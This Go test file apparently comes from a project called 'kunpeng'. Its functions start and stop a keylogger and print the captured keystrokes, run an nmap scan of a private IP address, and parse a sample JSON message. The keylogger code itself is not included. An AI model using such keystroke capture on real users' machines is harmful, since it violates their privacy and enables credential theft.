package main

import (
	"encoding/json"
	"fmt"
	"kunpeng/keylogger"
	"kunpeng/service"
	"time"
)

//
//func main() {
//
//	kellogg := &keylogger.KeyLoggerInfo{}
//	kellogg.KeyLoggerOver = false
//	go keylogger.RunKeyLogger(kellogg)
//	time.Sleep(5000 * time.Millisecond)
//	kellogg.KeyLoggerOver = true
//	print(kellogg.Recording)
//	var input string
//	fmt.Scanln(&input)
//}
type SocketInfo struct {
	ResultCode int32  `json:"ResultCode"`
	ResultMsg  string `json:"ResultMsg"`
}

func main() {
	testJson()
}
func TestKeyogger() {
	if !keylogger.StartKeyLogger() {
		print("stepone :keylogger has running!")
	}
	if !keylogger.StartKeyLogger() {
		print("steptwo :keylogger has running!")
	}
	time.Sleep(5000 * time.Millisecond)

	print(keylogger.GetKeyRecording())
	if !keylogger.EndKeyLogger() {
		print("steptwo:keylogger didn't open")
	}
	if !keylogger.EndKeyLogger() {
		print("steptwo:keylogger didn't open")
	}
	if !keylogger.StartKeyLogger() {
		print("stepone :keylogger has running!")
	}
	if !keylogger.StartKeyLogger() {
		print("steptwo :keylogger has running!")
	}
}
func TestNmap() {

	service.GetNmapInfoFromIp("10.59.13.137")

}
func testJson() {
	jsonStr := `
		{
			"ResultCode":104,
			"ResultMsg":"wdnmd"
		}
	`

	socketinfo := SocketInfo{}
	json.Unmarshal([]byte(jsonStr), &socketinfo)
	fmt.Println(socketinfo.ResultCode)
	fmt.Println(socketinfo.ResultMsg)
}
